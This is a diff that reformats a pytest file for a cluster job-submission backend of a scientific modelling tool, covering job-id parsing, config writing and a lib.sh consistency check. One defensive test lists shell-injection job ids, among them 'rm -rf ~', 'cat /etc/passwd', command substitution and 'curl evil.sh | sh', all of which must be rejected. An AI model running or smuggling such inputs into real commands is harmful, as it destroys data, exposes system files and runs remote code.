@@ -1,4 +1,5 @@
 """Tests for cluster submission backend (dry-run; no real SSH)."""
+
 from __future__ import annotations
 
 import importlib
@@ -41,8 +42,10 @@ def test_profile_vars_parse() -> None:
 
 
 def test_parse_job_id() -> None:
-    assert cluster.parse_job_id("Your job 1234567 (\"vagus_fwd\") has been submitted") == "1234567"
-    assert cluster.parse_job_id('Your job-array 222.1-32:1 ("vagus_fwd") has been submitted') == "222"
+    assert cluster.parse_job_id('Your job 1234567 ("vagus_fwd") has been submitted') == "1234567"
+    assert (
+        cluster.parse_job_id('Your job-array 222.1-32:1 ("vagus_fwd") has been submitted') == "222"
+    )
     assert cluster.parse_job_id("garbage") is None
 
 
@@ -84,16 +87,20 @@ def test_validate_modality_rejects_unknown() -> None:
 # status() interpolates the job id into a command string executed by the REMOTE
 # shell. Anything that isn't a plain scheduler id must be rejected outright.
 
-@pytest.mark.parametrize("bad", [
-    '1"; rm -rf ~ ;#',
-    "123; cat /etc/passwd",
-    "$(whoami)",
-    "`id`",
-    "123 && curl evil.sh | sh",
-    "../../etc/passwd",
-    "",
-    None,
-])
+
+@pytest.mark.parametrize(
+    "bad",
+    [
+        '1"; rm -rf ~ ;#',
+        "123; cat /etc/passwd",
+        "$(whoami)",
+        "`id`",
+        "123 && curl evil.sh | sh",
+        "../../etc/passwd",
+        "",
+        None,
+    ],
+)
 def test_validate_job_id_rejects_shell_metacharacters(bad) -> None:
     with pytest.raises(cluster.ClusterError):
         cluster.validate_job_id(bad)
@@ -116,16 +123,19 @@ def test_status_rejects_injected_job_id_before_any_ssh(monkeypatch) -> None:
 
 def test_write_run_config_injects_point_sources(tmp_path) -> None:
     import yaml
+
     out = tmp_path / "run.yaml"
     cluster.write_run_config(
-        [{"x": 1.0, "y": 2.0, "z": 3.0, "strength_nAm": 70}], out_path=out,
+        [{"x": 1.0, "y": 2.0, "z": 3.0, "strength_nAm": 70}],
+        out_path=out,
     )
     raw = yaml.safe_load(out.read_text())
     assert raw["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]
 
 
 def test_write_run_config_uses_the_working_config_and_never_clobbers_it(
-    tmp_path, monkeypatch,
+    tmp_path,
+    monkeypatch,
 ) -> None:
     """A submit must ship what the GUI is editing, and leave it untouched.
 
@@ -133,6 +143,7 @@ def test_write_run_config_uses_the_working_config_and_never_clobbers_it(
     copy, discarding every advanced edit both locally and on the cluster.
     """
     import yaml
+
     working = tmp_path / "gui_working.yaml"
     working.write_text(yaml.safe_dump({"marker": "edited-by-user"}))
     submit_to = tmp_path / "gui_submit.yaml"
@@ -143,7 +154,7 @@ def test_write_run_config_uses_the_working_config_and_never_clobbers_it(
 
     assert out == submit_to
     shipped = yaml.safe_load(submit_to.read_text())
-    assert shipped["marker"] == "edited-by-user"           # the user's edits, not defaults
+    assert shipped["marker"] == "edited-by-user"  # the user's edits, not defaults
     assert shipped["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]
     # the working copy is byte-for-byte untouched
     assert yaml.safe_load(working.read_text()) == {"marker": "edited-by-user"}
@@ -187,8 +198,9 @@ def test_fetch_dryrun(monkeypatch) -> None:
 def test_fetch_uses_the_configured_target_not_a_hardcoded_vagus(monkeypatch) -> None:
     """run_reduce.sh names the npz after TARGET_TAG, so fetch must follow it."""
     monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
-    monkeypatch.setattr(cluster, "leadfield_name",
-                        lambda modality="meg": "duneuro_leadfield_spine.npz")
+    monkeypatch.setattr(
+        cluster, "leadfield_name", lambda modality="meg": "duneuro_leadfield_spine.npz"
+    )
     res = cluster.fetch("kathleen")
     assert "duneuro_leadfield_spine.npz" in res["command"]
     assert "duneuro_leadfield_vagus.npz" not in res["command"]
@@ -200,32 +212,35 @@ def test_fetch_uses_the_configured_target_not_a_hardcoded_vagus(monkeypatch) -> 
 # target without importing Python. Duplication drifts, and drift here means a
 # cluster run solves a different tissue than the same flag does locally.
 
+
 def _lib_sh_targets() -> dict[str, str]:
     """Parse the SOURCE_TARGET -> TISSUES case block out of cluster/lib.sh."""
     lib = Path(__file__).resolve().parents[1] / "cluster" / "lib.sh"
     body = lib.read_text()
     block = re.search(
-        r"inob__source_target\(\)\s*\{.*?\bcase\b.*?\besac\b", body, re.S,
+        r"inob__source_target\(\)\s*\{.*?\bcase\b.*?\besac\b",
+        body,
+        re.S,
     )
     assert block, "could not locate the case block in cluster/lib.sh"
     return {
         m.group("tag"): m.group("tissues")
         for m in re.finditer(
             r'^\s*(?P<tag>\w+)\)\s*TISSUES="(?P<tissues>[^"]+)"',
-            block.group(0), re.M,
+            block.group(0),
+            re.M,
         )
     }
 
 
 def test_lib_sh_mirrors_source_targets_exactly() -> None:
     from inob.config import SOURCE_TARGETS
+
     shell = _lib_sh_targets()
     assert set(shell) == set(SOURCE_TARGETS), (
-        "cluster/lib.sh and inob.config.SOURCE_TARGETS disagree on which "
-        "targets exist"
+        "cluster/lib.sh and inob.config.SOURCE_TARGETS disagree on which targets exist"
     )
     for tag, spec in SOURCE_TARGETS.items():
         assert shell[tag] == spec["tissues"], (
-            f"target {tag!r}: lib.sh solves {shell[tag]!r} but Python solves "
-            f"{spec['tissues']!r}"
+            f"target {tag!r}: lib.sh solves {shell[tag]!r} but Python solves {spec['tissues']!r}"
         )
